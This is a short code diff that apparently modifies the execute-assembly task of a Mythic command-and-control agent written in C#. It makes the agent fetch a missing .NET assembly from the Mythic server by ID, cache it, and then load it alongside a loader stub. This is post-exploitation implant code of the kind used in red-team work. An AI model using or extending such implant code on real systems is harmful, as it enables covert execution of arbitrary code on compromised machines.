@@ -50,6 +50,8 @@ namespace Tasks
             public string PipeName;
             [DataMember(Name = "assembly_name")]
             public string AssemblyName;
+            [DataMember(Name = "assembly_id")]
+            public string AssemblyId;
             [DataMember(Name = "assembly_arguments")]
             public string AssemblyArguments;
             [DataMember(Name = "loader_stub_id")]
@@ -169,7 +171,15 @@ namespace Tasks
 
                 if (!_agent.GetFileManager().GetFileFromStore(parameters.AssemblyName, out byte[] assemblyBytes))
                 {
-                    throw new ExecuteAssemblyException($"'{parameters.AssemblyName}' is not loaded (have you registered it?");
+                    if (!_agent.GetFileManager().GetFile(_cancellationToken.Token, _data.ID, parameters.AssemblyId, out assemblyBytes))
+                    {
+                        resp = CreateTaskResponse($"Failed to fetch {parameters.AssemblyName} from Mythic", true);
+                        _agent.GetTaskManager().AddTaskResponseToQueue(resp);
+                        return;
+                    } else
+                    {
+                        _agent.GetFileManager().AddFileToStore(parameters.AssemblyName, assemblyBytes);
+                    }
                 }
 
                 if (!_agent.GetFileManager().GetFile(_cancellationToken.Token, _data.ID, parameters.LoaderStubId, out byte[] exeAsmPic))
